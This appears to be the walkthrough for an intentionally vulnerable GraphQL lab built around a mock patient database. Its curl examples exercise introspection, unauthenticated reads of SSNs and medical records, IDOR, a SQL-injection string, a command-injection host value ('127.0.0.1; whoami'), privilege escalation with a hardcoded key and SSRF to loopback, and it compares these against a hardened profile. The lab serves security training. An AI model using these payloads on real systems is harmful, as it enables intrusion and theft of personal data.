# Walkthrough

A guided tour of the testbed: bring it up, exercise representative
weaknesses from each category, observe the telemetry, then compare against
the hardened profile.

Expected time: ~15 minutes.

---

## 0. Prerequisites

- Node 20 (`nvm use` if you have nvm) **or** Docker.
- `curl` (or any GraphQL client - Postman, Insomnia, the VS Code REST
  Client extension reading [`requests.http`](../requests.http)).

---

## 1. Bring the lab up

With Node:

```bash
npm install
npm run lab          # TEST_MODE=LAB_FULLY_VULNERABLE
```

Or with Docker:

```bash
docker compose up --build
```

You should see:

```
API ready at http://localhost:4000/ (profile: LAB_FULLY_VULNERABLE)
```

Confirm the profile:

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ securityProfile { mode introspectionEnabled } }"}'
```

---

## 2. Dump the schema (A1)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

You now know every type, query and mutation the server exposes. This is the
starting point for every other attack.

---

## 3. Read every patient (A9 + A10)

No authentication required under LAB profile:

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ patients { name ssn medicalHistory balance } }"}'
```

Then pivot to a single patient by id, confirming there is no ownership
check (BOLA / IDOR):

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ patient(id: \"1\") { name ssn } }"}'
```

---

## 4. SQL-injection-style bypass (C1)

The `search` service short-circuits on quoted / boolean payloads and
returns the full table:

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d "{\"query\":\"{ searchPatients(query: \\\"' OR '1'='1\\\") { id name ssn } }\"}"
```

The same call goes through the SQLi pattern detector and writes a
`SQLI_PATTERN_DETECTED / CRITICAL` event to the telemetry log.

---

## 5. Command injection (C2)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ ping(host: \"127.0.0.1; whoami\") { output error } }"}'
```

The output contains both the ping result and the `whoami` output.
Telemetry records `COMMAND_INJECTION_PATTERN / CRITICAL`.

---

## 6. Privilege escalation (B7)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { promoteToAdmin(userId: \"4\", secretKey: \"admin_key_12345\") { id role } }"}'
```

`patient_john` is now an ADMIN. Telemetry records
`PRIVILEGE_ESCALATION_SUCCESS / CRITICAL`.

---

## 7. SSRF to a private host (E1)

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ fetchExternalData(url: \"http://127.0.0.1:4000/.well-known/apollo/server-health\") { statusCode body } }"}'
```

Reaching loopback from inside the API. Telemetry records
`SSRF_INTERNAL_TARGET / CRITICAL`.

---

## 8. Inspect the assessment log

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ assessmentSummary { totalEvents criticalEvents highEvents } assessmentEvents(limit: 10) { timestamp vector severity payload } }"}'
```

You should see at least the SQLi, command-injection, privilege-escalation
and SSRF events written by the previous steps.

---

## 9. Compare against the hardened profile

Stop the server (`Ctrl+C`) and restart in hardened mode:

```bash
TEST_MODE=BASELINE_HARDENED npm start
```

Re-run any payload from sections 2-7. Expected behaviour:

| Step | LAB                                | BASELINE_HARDENED                          |
| ---- | ---------------------------------- | ------------------------------------------ |
| 2    | full schema returned               | introspection disabled, error returned     |
| 3    | patient data returned              | `Authentication required`                  |
| 4    | full table leaked                  | `Authentication required`                  |
| 5    | shell output returned              | `Operation disabled by current profile`    |
| 6    | role flipped to ADMIN              | `Authentication required` / blocked        |
| 7    | inbound request to loopback        | `Operation disabled by current profile`    |

The fix that produces each "blocked" outcome is shown in
[`MITIGATIONS.md`](../MITIGATIONS.md).

---

## 10. Reset

```bash
curl -s -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { resetTestData(confirmPhrase: \"reset-test-data-confirmed\") }"}'
```

Wipes the assessment log and restores the seed data. The full payload
catalogue lives in [`PAYLOADS.graphql`](../PAYLOADS.graphql).
